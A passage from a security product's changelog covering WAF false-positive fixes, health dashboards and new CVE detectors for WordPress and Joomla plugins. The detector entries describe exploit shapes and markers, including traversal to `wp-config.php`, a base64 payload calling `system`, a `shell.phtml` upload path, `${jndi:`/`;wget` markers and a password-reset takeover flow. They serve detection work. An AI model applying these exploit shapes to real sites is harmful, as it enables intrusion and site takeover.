  challenged on a site (rule 302), breaking Facebook link previews. Fix: the
  content-pattern rules now scan the path truncated at the `data:` scheme
  (`strip_data_uri`); **structural** rules (traversal/long-path) keep the raw URI,
  so a `data:`-prefixed `../` is still caught, and a data: URI in a query **arg**
  (a real open-redirect/XSS vector) stays fully scanned.
- **WAF false positives on inline `data:` URIs in the request path (rules 302
  XSS / 320 RCE).** When a browser or link-preview crawler resolves an inline
  `data:...` URI as a *relative* URL, the whole payload arrives as the request
  path (which then 404s). Its content — inline JavaScript, or a base64 image/
  font — was scanned as if it were a reflected-XSS/code-exec payload. Two real
  incidents: `facebookexternalhit` crawling a `data:text/javascript,<counter>`
  script on `mobian.eu` got a **WAF_XSS** challenge (breaking that site's
  Facebook link previews, since a crawler can't solve a JS challenge); and a
  real Greek Vodafone customer on `epiplosou.gr` hitting a
  `/product/…/data:image/jpg;base64,<blob>` URL was **blocked and ban-listed**
  by the block-tier **WAF_RCE** rule — the base64 blob coincidentally contained
  `eval`/`exec`/`system` (all base64-alphabet letters). Fix: a `data:` URI in
  the request PATH is now recognised as a client artifact and skipped by the
  XSS/RCE URI heuristics, and the RCE base64 marker is paren-anchored
  (`eval(`/`exec(`/`system(`) so a base64 blob can never coincidentally trip it.
  Both rules keep full strength on real paths and query strings: reflected XSS,
  `data:` payloads in the **query string**, and the structural RCE markers
  (`${jndi:`, `;wget `, …) and traversal all still fire — a `data:` path prefix
  cannot evade them. RCE stays at `block`.
- **Daemon pinned at ~40% CPU while a dashboard tab stayed open.** The
  dashboard's Security overview polls `/api/v1/waf/engine/summary` every 10s,
  and the handler read the **entire** `history_events` table (every event
  type, unbounded time — millions of rows on a busy box) and filtered
  WAF-in-window rows in Go: ~1.4 GB of allocations per call, 543 GB
  cumulative in one observed hour, i.e. ~28 CPU-minutes of JSON decode + GC
  (plus a ~1.9 GB heap peak). The read is now windowed and type-filtered in
  SQL (`event_type IN (waf_observe, waf_trigger) AND ts_unix >= from`, served
  by the existing `idx_history_events_type_ts` index), which reduces it to
  just the WAF rows in the window — typically thousands, not millions.
  Regression-guarded by a test asserting the SQL-side filtering. Also raised
  the dashboard's cache TTLs on `/v1/system/dnat` (30s) and
  `/v1/system/ssl/stats` (60s): with the 5s/10s defaults, the 10s auto-refresh
  spawned a `cfm` CLI subprocess nearly every poll — and each `ssl stats` run
  triggered a daemon-side cert refresh + dumpall (another ~50 GB of
  allocations/hour on a 2.3k-cert box).

### Added
- **WebUI: Health page (`/cfm-admin/health/`) — metric history + anomaly
  feed.** New sidebar entry (Overview → Health, admin-only) rendering the
  daemon's existing in-memory health timeseries as proper ECharts line
  charts with a 1h/3h/6h/24h window selector: Utilization (CPU/RAM/swap/
  disk-/ %, one 0-100 axis), Load average, Network throughput (in/out
  Mbps), and Temperature (shown only when sensors report). Below them, the
  previously UI-less `/api/v1/health/anomalies` feed (auth-fail bursts,
  scope probes, …) as a table with per-IP deep links into WebDetector. The
  dashboard's Node health card links over ("History →"). To make the 24h
  window real, the health ring store's default capacity grows from 720
  samples (2-4h at the detector's 10-20s cadence) to 8640 (~1 MB per node).
- **Heartbeat now carries quick-glance vitals (fleet-monitoring Phase 1).**
  Alongside `dnat_enabled`/`edge`, the agent heartbeat sends a `vitals` block
  — load1, real CPU%, RAM%, swap%, disk-root%, uptime, and the mail-queue
  count (exim/postfix) when a queue detector is enabled. Nothing new is
  measured on the heartbeat path: values come from the health detector's
  in-memory sample ring (10s cadence) and the `mailq` store. The block is
  omitted (not zeroed) when the health detector is disabled or its latest
  sample is >2min stale, so cfm-web keeps its last record and can grey it
  out. Powers the Load/CPU/RAM/Swap/Disk/Mail-Q columns on the cfm-web
  Agents list.
- **Mail queue in the health surface (`cfm health` + dashboard).** The
  exim_queues/postfix_queues detectors now publish their latest queue count
  (total + frozen/deferred) to a tiny shared store (`internal/mailq`,
  healthstore pattern), and the health snapshot carries it as `mail`
  (`mta`/`queued`/`frozen`/`age_seconds`) — the queue is counted ONCE, by the
  detector with its operator-configurable `TOTAL_CMD`, no extra probing on
  the snapshot path. `cfm health` prints a "Mail queue" section and the
  dashboard Node health card gets a "Mail queue" tile + header issue chip
  (warn ≥500 queued / ≥200 frozen, danger ≥5000/≥2000 — the detector's alert
  defaults). Quiet on boxes where neither queue detector is enabled. A spam
  blast filling the queue is now visible at a glance before the blacklists
  notice. Also hardened the queue detectors' count parsing: the count command
  runs under a login shell, so profile noise (motd, `/etc/profile.d` chatter)
  before the number no longer breaks parsing (last numeric line wins).

### Removed
- **Dashboard: "Cache overview" card and `cfm_cache_stats` dict tile.**
  Leftovers of the abandoned static/micro caching experiment — the card only
  ever showed the reference TTL table and "Cache telemetry not available
  yet", and the shared-dict tile was permanently "unavailable".

### Changed
- **Dashboard: sslcollector status stays quiet unless actually not ready.**
  The stats poll usually has *something* stale in `last_error`, so the
  always-on error surfacing read as noise; the last error is now only a
  hover tooltip on the status tile.

### Added
- **Dashboard: "Rescan certs" button on the SSL certificates card.** Backed by
  the new admin-only `POST /api/v1/system/ssl/refresh` (runs `cfm ssl refresh
  --json`, bounded to 90s) — forces a certificate-source rescan + collector
  refresh from the UI, then re-pulls fresh stats. Hidden for read-only viewers.

### Fixed
- **Dashboard: SSL certificates card showed "Collector stats unavailable".**
  `cfm ssl stats --json` emits a log line (`[sslcollector] snapshot: wrote …`,
  the CLI process's `logging.Logf` goes to stdout) before the JSON body, so
  the daemon's whole-output `json.Unmarshal` failed and the UI got an opaque
  string. The system endpoints now recover the JSON object from mixed CLI
  output (retry from the first `{`).
- **Dashboard: "WAF rule modes" collapsed on every auto-refresh.** The
  Nginx-internals rebuild now carries the `<details>` open state across
  renders (the DNAT/SSL raw views never had the problem — only their inner
  `<pre>` text is updated).
- **SMART: Samsung SATA SSDs reported no wearout and 0°C.** Two parsing bugs
  in the health detector's `smartctl -a` reader (`parseSmartInfo`): (1) attr
  **177 Wear_Leveling_Count** — the Samsung SATA wear indicator, normalized
  VALUE declines from 100 — wasn't in the remaining-style attribute set, so
  MZ7L3-class drives showed `wearout n/a` in `cfm health --disk-detail` and
  the dashboard while their NVMe siblings reported fine; (2) the ATA
  temperature regex captured "the first number after the attribute name",
  which is the leading 0 of the hex FLAG column (`0x0022`) — every SATA drive
  reported 0°C. Temperature now reads attr 194/190's RAW_VALUE. Wearout from
  177 also feeds the existing `HEALTH/SMART_WEAR_WARN/CRIT` thresholds, which
  previously never armed for these drives.

### Changed
- **Dashboard: SMART devices table always visible; "Nginx overview" card
  removed.** The SMART per-device table was inside a `<details>` that the
  10s auto-refresh reset to collapsed — it's now a normal always-visible
  table under Storage health. The "Nginx overview" card duplicated a subset
  of "Nginx internals" directly below it and is removed; internals got a
  format pass — version/worker/connection gauges merged into one leading
  "nginx — worker & connections" section, and counter tiles the build
  doesn't expose (accepted/handled/requests without `stub_status`) are
  omitted instead of rendering "-". The sslcollector-health row drops the
  version-hash / snapshot-written / poll-interval / last-error tiles; a
  recent collector error now shows as a ⚠ on the status tile with the
  message in its tooltip.

### Added
- **Web Bots: per-UA drilldown panel (vhosts / IPs+geo/ASN / paths / raw
  variants) with inline actions.** The Live UA Top table gains a **details**
  button that opens a drilldown for that normalized UA on the same page:
  which vhosts it hits (with a per-vhost **challenge** action), which source
  IPs (hits, country, ASN, cached PTR, and a per-IP **block** action using the
  toolbar TTL/reason), top request paths, and the raw UA variants that
  collapsed into the normalized key. Vhost/IP cells deep-link into the
  WebDetector drilldown. Backing it, `GET /api/v1/webdet/ua-drill` now
  **arms detailed per-UA tracking (unique IPs + top paths) for 10 minutes as
  a side effect** — previously the IP sets only accumulated while an
  emergency rule was active, so the operator had to install a rule just to
  see who a UA was; now opening the drilldown is enough
  (`ip_tracking_active: false` in the response = data still warming; the
  panel auto-refreshes and re-arms while open). Per-UA top-path tracking is
  new, same gate, capped at 200 distinct paths per UA per bucket. IP rows are
  enriched via the non-blocking enricher path (country/ASN inline from the
  local MMDBs, PTR async). The old "Unique IPs shows 0 until a rule is
  installed" note (UI + `cfm bots top` hint) is updated accordingly.
- **Dashboard: "Node health" card fed by the health snapshot.** The
  `/cfm-admin` dashboard's "Health quick stats" card never received data (its
  fields stayed `-`); it is replaced by a wide **Node health** card driven by
  the same `health.snapshot.v1` payload as `cfm health`: CPU (real busy% +
  usr/sys/io breakdown), load 1/5/15, RAM/swap, conntrack, network throughput,
  an **Edge / runtime** chip row (CFM daemon/service, web+panel DNAT,
  active edge — openresty/angie — upstream, challenge-flow readiness, SSL
  collector, ingest socket, systemd services), a per-mount **Disks** table
  (use% + inode%) and **Storage health** (SMART/wearout/MDADM/ZFS summary +
  per-device SMART table). A header pill rolls the snapshot up to
  healthy / N issues, with the issue list shown as chips. The CPU, load, RAM,
  swap and net in/out tiles carry a **1h trend sparkline** (12 × 5m-avg points
  from the existing `/api/v1/health/timeseries` ring store; best-effort — the
  card renders without them). The card is hidden for scoped viewers (the
  endpoint is admin-only).
- **`/api/v1/health/snapshot` opt-in cache (`?cache_ttl=`).** Default stays a
  fresh collection (what `cfm health` expects). With `cache_ttl` (same 1s..1m
  clamp as the other system endpoints) the daemon serves a cached snapshot and
  recollects at most once per TTL in the background (stale-while-revalidate),
  so the dashboard's 10s auto-refresh costs one ~1-2s collection per minute
  instead of one per poll. `collected_at` reports the snapshot's real age.

### Removed
- **Dashboard: "Bot / throttle overview" card.** It rarely had data on the
  dashboard ("No data.") while the dedicated Web Bots page covers the same
  ground properly — dropped from the dashboard to reduce noise.

### Added
- **Health snapshot: host detail round-out (fleet-monitoring Phase 0).** The
  health pipeline (detector sampler → `/api/v1/health/snapshot` → `cfm
  health`) now also collects: **swap** used/total, memory breakdown
  (available/buffers/cached), **system uptime**, CPU identity (model, threads,
  MHz), **real CPU utilization** from `/proc/stat` deltas with a
  user/system/iowait/steal breakdown (`cpu_percent_source: "procstat"`;
  previously `cpu_percent` was a load1/cores estimate, which remains only as
  the seeding-call fallback, tagged `"load_estimate"`), per-whole-device
  **disk I/O rates** from `/proc/diskstats`, **per-NIC throughput** (busiest
  first, capped at 16), and OS/kernel identity (`/etc/os-release` +
  `osrelease`). `cfm health` prints all of it (OS/uptime/CPU model lines,
  load 1/5/15, CPU breakdown, RAM detail, Swap line, Disk `I/O:` line,
  Network `Throughput:` + per-NIC). The in-memory health timeseries samples
  and points gain `cpu_pct` and `swap_used_pct`. Rate fields are delta-based
  (seed-then-diff, same pattern as bandwidth): the first sample in a process
  reports no rates. Groundwork for the cfm-web per-agent health page.
- **Heartbeat now reports the active edge proxy (`edge` + `edge_version`).**
  Alongside `dnat_enabled`, the agent heartbeat tells cfm-web which in-path
  edge is active right now — `openresty` or `angie` (via `systemctl is-active`,
  the same probe the sslcollector reload path uses) — plus the edge binary's
  version token (e.g. `openresty/1.25.3.2`, `Angie/1.12.1`, best-effort via
  `-v`). An empty `edge` is a real "no edge running" observation and clears the
  central record; the keys are omitted entirely when detection cannot run (no
  systemd), so cfm-web keeps its last known value. Pairs with the cfm-web
  "Edge" column on the Agents table, giving the operator a fleet-wide view of
  the OpenResty/Angie mix and of servers whose edge dropped.

### Changed
- **WAF → autoblock: `WAF_WEBSHELL` (rule 413) is now armed by default.** The
  webshell drop-path family (proper-noun names: `c99`/`r57`/`wso`/`b374k`/…) has
  an edge-`block` rule (413) but was held un-armed through burn-in, because a
  webshell GET-probe (`/c99.php`) is also what benign internet scanners
  (Shodan/Censys/uptime monitors) do, so auto-arming would nft-ban them. The
  operator now runs it armed fleet-wide and confirms it reliably bans malicious
  scanners/scrapers/bots with acceptable collateral, so it is armed by default
  (`WEBSHELL = 1`) in both the code default (`wafSecurityFamilies`) and the
  reference `detectors.conf`. Every WAF family with an edge-`block` rule now arms
  to 1 with no exceptions. **Upgrade impact:** an existing `/etc/cfm/detectors.conf`
  that doesn't list `WEBSHELL` inherits the new armed default — sources probing for
  known webshells get a 6h soft nft ban (previously edge-403 only). To keep a
  benign scanner out of it, exempt it with `ALLOW_UA_CONTAINS`/`ALLOW_NETS`, hold
  the rule with `RULE_413 = 0`, or set `WEBSHELL = 0`.

### Fixed
- **WAF object injection (rule 329): exclude Akeeba Restore endpoints.** A legit
  Joomla admin running a core update (`option=com_joomlaupdate&task=update.install`)
  was blocked **and ban-listed** on every extraction step (`WAF_RCE:PHP_OBJECT_INJECTION:BASE64`).
  Akeeba Restore — which drives Joomla core updates *and* Akeeba Backup restores —
  round-trips its engine state as a base64-encoded PHP-serialized object in the
  `factory` POST field on **every** step; that blob is a genuine `O:N:"…"` object,
  so the detector cannot tell it from an attack by shape. The WordPress-cookie
  unauth gate also does not recognise a Joomla admin session, so the request
  looked unauthenticated. Rule 329 now skips the known Akeeba Restore endpoints
  (`com_joomlaupdate/{extract,restore,finalisation}.php` and `com_akeeba*/{restore,finalisation}.php`)
  by URI context, the same both-sides carve-out pattern used for `/.well-known/`.
  The generic serialize rule (306, args-only, challenge) still applies.
- **WAF CRLF (rule 605): stop flagging `Content-Type`/`Content-Length` in
  request *bodies*.** A logged-in admin's page-builder `wp-admin/admin-ajax.php`
  save POST — whose payload legitimately embeds a `\r\nContent-Type:` line
  (oEmbed/email/template HTML) — tripped `WAF_CRLF:CRLF_CONTENT_TYPE` (logonly,
  so only log noise, but a confirmed false positive). The #1109 fix only scoped
  those two tags to the args surface for *multipart* requests; this generalises
  it to **all** requests: `content-type`/`content-length` are matched in the
  query string only (raw and URL-encoded), because a request-body value is
  essentially never reflected into a *response* `Content-Type`/`Length` header.
  The high-impact response-splitting headers `Set-Cookie`/`Location` stay
  full-surface (args+body) and still fire from a body. Removes the request
  Content-Type header inspection entirely (subsumes the multipart carve-out).

### Added
- **WAF CVE detector: WordPress core "wp2shell" unauth RCE chain
  (rule 10011, CVE-2026-63030 + CVE-2026-60137).** A WordPress **core** flaw — a
  bare install with zero plugins is exploitable — that chains a REST batch-route
  confusion (CVE-2026-63030) with a core SQL injection (CVE-2026-60137) to run
  code from an anonymous HTTP request. Affects WP 6.9–6.9.4 and 7.0–7.0.1 (fixed
  in 6.9.5 / 7.0.2 via forced auto-update); a working PoC is public and it is
  actively exploited. The detector gates on the REST batch endpoint (`batch/v1`,
  either `/wp-json/batch/v1` or `?rest_route=/batch/v1`) and fires on two
  near-zero-FP markers in the normalized body: the `"///"` desync primer *path*
  value (route confusion → `BATCH_DESYNC`, attributed to CVE-2026-63030), and an
  `author_exclude` / `author_not_in` REST parameter whose **extracted value** is
  not a clean integer list (core SQLi → `BATCH_SQLI`, attributed to
  CVE-2026-60137). Both checks are scoped to the specific field value — not the
  whole batch body — so a legit batch that merely mentions `author_exclude` or
  `) or ` in post prose is not blocked; the SQLi check is technique-agnostic
  (matches any non-integer value), so it can't be dodged with `/**/` or `#`
  comment obfuscation. Signature taken from the public PoC, not from memory. Armed
  at `block` (WAF_CVE family): nft-ban + CVE-named Slack/mail alert.
- **WAF CVE detector: Multi Uploader for Gravity Forms unauth upload → RCE
  (rule 10010, CVE-2025-23921).** The Multi Uploader for Gravity Forms plugin
  (`<= 1.1.3`, CVSS 9.0, actively exploited since Aug 2024) has an
  unauthenticated arbitrary file upload: a multipart POST to the `gf_page=upload`
  endpoint whose `gform_unique_id` field — normally a UUID — is set to a
  path-traversal destination ending in a php-executable extension
  (`../../../…/shell.phtml`), writing a webshell outside the intended upload
  dir. This is a **genuine gap over rule 401**: the php-exec extension rides in
  the `gform_unique_id` *field value* (the traversal destination), not the
  multipart `filename=`, so 401's filename matcher never sees it. The detector
  extracts the `gform_unique_id` value and requires **both** traversal **and** a
  php-exec extension in it, so a legit upload whose file *content* happens to
  contain `../`/`.phtml` can't false-positive (a real `gform_unique_id` is a bare
  UUID). `WAF_CVE` armed → first probe 403s + nft-bans. Reason
  `WAF_CVE:CVE_2025_23921:GF_MULTI_UPLOADER:TRAVERSAL_PHTML`. Positive+negative
  Lua tests. Shape confirmed against WPScan/Wordfence/Patchstack + operator
  threat-intel, not memory.
- **WAF rule 329: unauthenticated PHP object injection → armed block
  (`WAF_RCE:PHP_OBJECT_INJECTION`).** Closes the ~153-site deserialization-RCE
  exposure (kirki/jet-engine/woodmart/better-search-replace/fusion …) without a
  per-plugin endpoint list. Fires on a PHP serialized OBJECT marker
  (`O:N:"…"`/`C:N:"…"` — not `a:N:` arrays, which are common/benign) in an
  **unauthenticated** request, in **args OR body**, including **base64**-encoded
  payloads. Emits `WAF_RCE` (already armed by default) so a hit 403s + nft-bans.
  This is deliberately stronger than rule 306 (`WAF_SERIALIZE`, challenge,
  **args-only**) and closes rule 304's logonly `B64_OBJ_INJECT` gap — but only
  for unauthenticated requests: legit serialized blobs (WooCommerce/Elementor/
  WPML) ride authenticated admin-ajax and carry the WP logged-in cookie, so the
  unauth gate keeps FP near-zero, and rule 306 still handles the authenticated
  case at challenge. Positive+negative Lua tests (authenticated marker,
  serialized arrays, and benign `o:N`-looking text stay clean).
- **WAF CVE detector: Kirki unauth account takeover (rule 10009,
  CVE-2026-8206).** Kirki (`<= 6.0.6`, CVSS 9.8, actively mass-exploited) exposes
  an unauthenticated REST endpoint
  `POST /wp-json/KirkiComponentLibrary/v1/kirki-forgot-password` whose
  `handle_forgot_password()` accepts a `username` and an `email` independently
  without checking the email belongs to that user — so an attacker requests a
  reset for any admin username, supplies their own email, and receives the reset
  link → full account takeover. The detector keys on the endpoint + both
  `username` and `email` (both are required for the exploit; a single-field
  legitimate reset is let through — strictly fewer FPs than blocking the bare
  endpoint, and Kirki is typically a bundled theme dependency so the endpoint
  sees ~zero legit traffic anyway). `WAF_CVE` armed → first probe 403s +
  nft-bans. Reason `WAF_CVE:CVE_2026_8206:KIRKI:FORGOT_PASSWORD`. Positive+negative
  Lua tests. Endpoint/params confirmed against WPScan / the public PoC, not
  memory.
- **WAF CVE detector: Avada / Fusion Builder unauth RCE + file delete (rule
  10008, CVE-2026-6279 + CVE-2026-8713).** Rule group R4 from the fleet scan;
  completes the "block now" net-new set. Two unauth `admin-ajax.php` nopriv
  legs: (A) `action=fusion_get_widget_markup` with a base64 `render_logics`
  param that decodes to `{"type":"wp_conditional_tags","value":{"function":
  "system",…}}` — the `function` value reaches `call_user_func()` with no
  allowlist (RCE, CVE-2026-6279). The detector decodes `render_logics` and flags
  a dangerous callable (a legitimate `wp_conditional_tags` only calls `is_*` WP
  conditional tags). (B) `action=fusion_form_submit_ajax` +
  `privacy_expiration_action` — a server-side-only field a client never sends,
  which triggers `maybe_delete_files()` on an attacker-controlled path (delete
  `wp-config.php` → takeover; CVE-2026-8713). `WAF_CVE` armed → first probe
  403s + nft-bans. Reasons `WAF_CVE:CVE_2026_6279:FUSION_BUILDER:RCE` /
  `WAF_CVE:CVE_2026_8713:FUSION_BUILDER:FILE_DELETE`. Positive+negative Lua
  tests (legit `is_front_page` render logic and a normal form submission stay
  clean). Shapes confirmed against the CVE-2026-6279 PoC / WPScan, not memory.
- **WAF CVE detector: Post SMTP unauth email-log disclosure (rule 10007,
  CVE-2025-11833 + CVE-2023-6875).** Rule group R7 from the fleet scan. A
  missing capability check lets an unauthenticated caller read the plugin's
  email logs — including password-reset links — and take over admin (the fleet's
  "mass-mailer pivot": post-smtp is an SMTP relay, so takeover yields working
  outbound mail creds). Blocks UNAUTH requests to the plugin's REST namespace
  `/wp-json/post-smtp/` (the `v1/get-log(s)` / `v1/connect-app` endpoints) or the
  `postman_email_log` admin page. UNAUTH-gated on the absence of a
  `wordpress_logged_in_*` cookie, so a real admin (and the plugin's own admin-UI
  AJAX) is exempt while the exploit is blocked. `WAF_CVE` armed → first probe
  403s + nft-bans. Reason `WAF_CVE:CVE_2025_11833:POST_SMTP:{REST,EMAIL_LOG}`.
  Positive+negative Lua tests (logged-in admin, other REST namespaces, and
  non-postman admin pages stay clean). Endpoints confirmed against WPScan /
  ZeroPath / NVD, not memory.
- **WAF CVE detector: W3 Total Cache mfunc RCE surface (rule 10006,
  CVE-2026-5032 + CVE-2025-9501).** Highest-exposure item on the fleet scan
  (51 sites; rule group R1). Two unauth legs: (A) a `User-Agent` containing
  `W3 Total Cache` — which bypasses W3TC's output buffering and leaks the
  `W3TC_DYNAMIC_SECURITY` token needed to sign an mfunc payload (CVE-2026-5032;
  nothing legitimate sends that UA, zero FP), all methods; and (B) a
  `mfunc`/`mclude` dynamic-fragment marker in a POST to `wp-comments-post.php`
  or `/wp-json/wp/v2/comments` — the tag W3TC `eval()`s on cached render
  (CVE-2025-9501). Per the fleet spec, the marker is matched as a **substring**
  (not the exact `<!--mfunc …-->` tag form — three vendor fixes were bypassed by
  nesting), scoped to the comment endpoints; `dynamic_cache` is deliberately not
  matched (higher FP, not the eval tag). `WAF_CVE` is armed → first probe 403s +
  nft-bans. Reasons `WAF_CVE:CVE_2026_5032:W3TC:UA_TOKEN_LEAK` /
  `WAF_CVE:CVE_2025_9501:W3TC:MFUNC`. Positive+negative Lua tests. Shapes
  confirmed against WPScan / rcesecurity.com, not memory.
- **WAF CVE detector: Slider Revolution virtual-patch (rule 10005,
  CVE-2015-1579 + classic upload RCE).** A behavioural (shape-based) rule, not a
  version match: blocks the two classic UNAUTH revslider exploit shapes on ANY
  version — (A) `admin-ajax.php?action=revslider_show_image&img=../wp-config.php`
  arbitrary file read (CVE-2015-1579), and (B) `action=revslider_ajax_action` +
  `client_action=update_plugin` arbitrary plugin/ZIP upload → RCE (the Metasploit
  `wp_revslider_upload_execute` vector). Leg B is gated on UNAUTH (no
  `wordpress_logged_in_*` cookie) since `update_plugin` is a real admin action.
  Fills a genuine gap — a revslider `update_plugin` ZIP-with-PHP upload is not
  caught by the generic upload rules (401 sees only the outer `.zip`; 414 is
  Joomla-scoped). Runs before the generic traversal rule so the CVE attribution
  wins. `WAF_CVE` is armed → first probe 403s + nft-bans the scanner. Reasons:
  `WAF_CVE:CVE_2015_1579:REVSLIDER:LFI` / `WAF_CVE:REVSLIDER:PLUGIN_UPLOAD`.
  Positive+negative Lua tests (legit `get_slider_html`, authed-admin
  `update_plugin`, and non-traversal `img` stay clean).
- **WAF CVE detector: LiteSpeed Cache privilege escalation (rule 10004,
  CVE-2024-28000).** Detects the unauthenticated privesc in LiteSpeed Cache
  `< 6.4` (30 sites on the fleet): the crawler role-simulation validates a weak
  6-char hash (~1M values) from a `litespeed_hash` cookie, so an attacker
  brute-forces it to be simulated as admin. Keyed on the presence of a
  `litespeed_hash`/`litespeed_role` **cookie** — an internal mechanism a real
  visitor never sets (zero FP per Wordfence/Patchstack), matched at the cookie
  name boundary so a value substring can't trip it. Runs on **all methods**
  (the brute-force is a GET to the REST API), not just POST. `WAF_CVE` is armed,
  so the **first** guessed-hash request 403s AND nft-bans the source — killing
  the ~1M-request brute-force after a single attempt, and alerting as
  `WAF/CVE-2024-28000`. First detector from the operator's fleet-scan worklist
  (rule group R6). Positive+negative Lua tests (incl. legit `_lscache_vary` and
  WP session cookies stay clean); Lua↔Go id parity kept.
- **WAF CVE detector: Ninja Forms File Uploads RCE (rule 10003,
  CVE-2026-0740).** Detects the unauthenticated arbitrary-file-upload +
  path-traversal exploit in the Ninja Forms "File Uploads" add-on that the
  July-2026 ACSC CMS campaign probes: `POST /wp-admin/admin-ajax.php` with the
  add-on action `nf_fu_upload` plus an exploit marker — a php-executable upload
  filename, or path traversal in the `image_jpg` destination param
  (`../../../`). Keyed on the SPECIFIC action (a bare `admin-ajax.php` match is
  deliberately not enough — form submissions are common), so a legitimate
  Ninja Forms upload (image/pdf, normal dest) does not fire. `WAF_CVE` is armed,
  so a hit `403`s + 6h-nft-bans + Slack/mails as `WAF/CVE-2026-0740`. Runs
  before the generic upload rules so the CVE reason wins attribution.
  Positive+negative Lua tests (both exploit legs); Lua↔Go id parity kept.
- **WAF CVE detector: Joomla JCE profile-import RCE (rule 10002,
  CVE-2026-48907).** Detects the unauthenticated arbitrary-PHP-upload exploit in
  Joomla's JCE extension (`< 2.9.99.5`) that the July-2026 ACSC CMS campaign
  probes (CISA KEV): `POST /index.php?option=com_jce` with the `profiles.import`
  action and a php-executable file in the multipart upload (double-extension
  `.xml.php`). Keyed on the component (`com_jce`) + action value
  (`profiles.import`) + a php-exec upload filename — matched as value substrings
  so it survives the PoC's all-multipart encoding, and reusing the hardened
  rule-401 filename matcher for the multipart-CT gate and double-extension
  coverage. Near-zero FP (a legit profile import ships `.xml`/`.zip`, never
  `.php`) → ships at `block`; runs before the generic upload rules so the
  `WAF/CVE-2026-48907` reason wins attribution. `WAF_CVE` is armed, so a hit
  6h-nft-bans + Slack/mails. Positive+negative Lua tests; Lua↔Go id parity kept.
- **First WAF CVE detector: Simple File List upload→rename RCE (rule 10001,
  CVE-2025-34085 / CVE-2020-36847).** Detects the WordPress Simple File List
  exploit the July-2026 ACSC CMS campaign probes: a PHP payload uploaded as an
  image to `…/simple-file-list/ee-upload-engine.php`, then renamed to a
  php-executable extension via `…/ee-file-engine.php`. Keyed on the endpoint plus
  an exec-extension/`<?php` marker (not the volatile PoC parameter names), so one
  detector covers both CVEs; near-zero FP → ships at `block`. This also lays the
  reusable **WAF_CVE** framework foothold from WAF_CVE_PLAN.md: named-vulnerability
  rules use the new `10000+` ID band (Lua↔Go parity + grouping tests updated), and
  the `waf_security` autoblock notification now surfaces the concrete CVE —
  `WAF/CVE-2025-34085` with the `rule_id` and a `cve` Extra field — instead of a
  generic `WAF/CVE`. **Autoblock:** `WAF_CVE` is armed by default (`CVE = 1`, like
  the other block-tier families) so a Simple File List hit gets a 6h nft ban AND a
  `WAF/CVE-2025-34085` Slack/mail alert — an un-armed family notifies nothing. The
  family is heterogeneous, so a lower-confidence CVE rule ships with a per-rule
  `RULE_<id> = 0` (hold the rule, not the family); `DRY_RUN = 1` gives a
  watch-first burn-in. GR/CY leniency applies. `go test`/`vet`/`build`,
  `make lua`/`test-lua` green.
- **`WAF_CVE.md` — as-built reference + "CVE hunting" workflow.** Documents the
  live CVE framework (10000+ id band, `WAF_CVE` family, CVE-named
  notifications, the un-armed-by-default autoblock safety, the Simple File List
  detector, and the ACSC candidate status) plus a step-by-step recipe for
  adding the next CVE detector. CLAUDE.md §6 gets a `WAF_CVE` subsection and a
  §7 docs-table pointer, so future CVE work starts from the checklist instead
  of relearning it.

### Fixed
- **cfm-lsm: silence OBS-004 ptrace-telemetry noise from cPanel/CloudLinux
  control-plane.** `CFML-OBS-004` (ptrace by a web-class uid, monitor-only)
  fires whenever a watched uid reads its own process tree via /proc — reading
  `/proc/<pid>/{stat,exe}` routes through `ptrace_may_access`, so cPanel's
  jailshell/PHP `ps` calls and the cPanel/CloudLinux API machinery (`cpanel`
  → `cpapi2`, `uapi`, `cloudlinux-cli-user.py`, `lve_suwrapper`) generate the
  bulk of OBS-004 events. All are same-uid, not cross-tenant. Added those comms
  to the `CFML-OBS-004` `allow_comm` list in the reference `configs/lsm.conf`
  (scoped to this policy, NOT global: `allow_comm` matches the spoofable
  `task->comm`, so a global entry would also exempt the names from CRED-002 /
  CRED-004 / EXEC-003 — keeping them per-policy limits the blind spot to ptrace
  telemetry). `lsphp` is deliberately excluded (a PHP worker ptracing a sibling
  is the exact threat OBS-004 exists to surface). Noise reduction only; the
  block layer remains kernsec `yama.ptrace_scope=2`.
- **cfm-lsm: silence CRED-002 false positives from stock cPanel/cron daemons.**
  `CFML-CRED-002` (privilege escalation without a setuid path, monitor-only)
  fires when a task transitions uid→0 via a setuid-family syscall from a binary
  that carries no `S_ISUID` bit and is not allowlisted. On stock cPanel hosts
  three root-started system daemons legitimately do exactly that and were
  generating recurring noise: `crond` (re-credentialing per-user cron jobs),
  `pkgacct` (account backup/transfer), and `process_ssl_reissue` (AutoSSL). None
  are web-origin. Added them to the `CFML-CRED-002` `allow_exe` list in the
  reference `configs/lsm.conf` (these paths are also stat()'d into the BPF-side
  `cfm_setuid_inodes` map, so they gate the kernel decision, not just the
  userspace post-filter). The cPanel Perl taskqueue is deliberately left out —
  its exe is the generic `perl` interpreter. Operators pull this in by syncing
  the reference config (or adding the three `allow_exe` lines to
  `/etc/cfm/lsm.conf`) and running `cfm lsm restart`.
- **WAF CRLF rule (605) no longer flags legit multipart uploads.** A
  `multipart/form-data` body carries a per-part `Content-Type:` (and sometimes
  `Content-Length:`) MIME header on its own `\r\n`-terminated line for every
  file/typed part, so the raw `[\r\n]…content-type:` match in
  `detect_crlf_injection` tripped `WAF_CRLF:CRLF_CONTENT_TYPE` on essentially
  every legitimate upload — webmail (roundcube attachment compose), WordPress
  `wp-admin/async-upload.php` / Elementor, OpenCart filemanager, TYPO3 — a
  structural false positive (rule 605 was held at `logonly` precisely because of
  it). The content-type/content-length match — **both** the raw and the
  URL-encoded branch, since the framing's `\r\nContent-Type:` survives
  url-decoding — is now scoped to the ARGS surface when the request body is
  `multipart/form-data` (those header names can appear legitimately in a
  multipart body but never in the query string); Set-Cookie / Location stay
  full-surface, so detection of the impactful response-splitting vectors is
  unchanged. The request Content-Type is read via `header_string()` so a
  duplicated header (delivered as a table) can't crash the detector. Kept at
  `logonly` pending a fresh burn-in of the carve-out before promoting back to
  `challenge`. Covered by `scripts/tests/cfm_waf_crlf_multipart_test.lua`.

### Changed
- **Traffic-rules throttle no longer over-429s shared/NAT IPs (F21).** The
  `rule_action=throttle` limiter took a per-(profile,host,ip) spin-lock around a
  token bucket, and on lock-acquisition timeout returned a 429 regardless of
  remaining budget. Under carrier-grade NAT or a shared proxy, many legitimate
  users behind one IP contend on that single lock, so lock-losers were 429'd with
  budget to spare — a false positive. It is now a lock-free fixed-window counter
  (one atomic `incr` per request, keyed per profile/host/window/IP): with no lock
  there is no contention to mis-handle, so a legitimate burst is admitted up to
  the profile's limit exactly. The per-profile rate/limit is preserved (soft_bot
  20 per 10 s = 2/s + burst 20, medium 10/10 s, hard 5/10 s); a window boundary
